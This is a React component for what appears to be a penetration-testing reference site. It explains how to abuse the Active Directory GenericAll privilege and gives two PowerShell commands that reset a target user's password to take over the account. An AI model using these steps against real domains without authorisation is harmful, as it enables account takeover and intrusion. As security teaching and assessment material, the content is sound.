import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const GenericAll = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              This grants us full control over a target object. This privilege
              allows the trustee to manipulate the target object however they
              wish. To take control over the user, we can do a{" "}
              <a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall">
                Targeted Kerberoast Attack
              </a>{" "}
              on the user or more simply just change the user's password.
            </Typography>
            <img
              src="/GenericWriteAll.png"
              width={520}
              height={183}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Create a new password variable.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                '$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              Change one of the user's passwords to the password you created.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'Set-ADAccountPassword -Identity "ACCOUNT" -Reset -NewPassword $Password'
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default GenericAll;
